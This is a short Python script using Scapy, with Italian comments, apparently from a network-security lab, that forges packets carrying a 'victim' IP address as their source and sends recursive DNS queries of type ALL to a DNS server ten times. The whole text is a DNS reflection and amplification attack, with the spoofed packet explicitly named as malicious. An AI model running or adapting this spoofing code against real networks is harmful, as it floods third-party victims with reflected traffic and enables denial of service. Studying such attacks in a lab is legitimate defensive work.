# 1. Definiamo gli IP
victim_ip = "10.9.0.20"
dns_server = "10.9.1.153"

# 2. Costruiamo i layer del pacchetto
ip_layer = IP(src=victim_ip, dst=dns_server)
udp_layer = UDP(sport=RandShort(), dport=53)
dns_layer = DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ALL"))

# 3. Assembliamo e inviamo il pacchetto 10 volte
malicious_pkt = ip_layer / udp_layer / dns_layer
send(malicious_pkt, count=10)

